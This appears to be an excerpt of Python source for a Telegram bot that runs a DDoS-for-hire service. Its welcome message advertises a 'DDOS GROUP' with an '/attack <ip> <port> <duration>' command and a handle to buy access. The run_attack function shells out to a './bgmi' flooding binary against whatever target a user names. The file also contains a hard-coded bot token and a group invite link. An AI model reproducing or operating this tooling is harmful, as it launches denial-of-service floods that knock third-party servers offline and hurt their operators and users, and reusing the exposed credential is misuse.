...
TELEGRAM_BOT_TOKEN = '7849069672:AAEUBwOrtw5--VPMUrX24WzoZ06iHaV9gw4'
ADMIN_USER_ID = 7279164468
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*😈 NUCLEAR FREE DDOS GROUP 😈*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "* DM TO BUY :- @NNUCLEAR_OP *"
    )
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} 1000"
...
async def attack(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=chat_id, text=(
        ...
        f"*🔥 Join :- https://t.me/+8d_8xWZiin40YjM9 DDOS 💥*"
    ), parse_mode='Markdown')
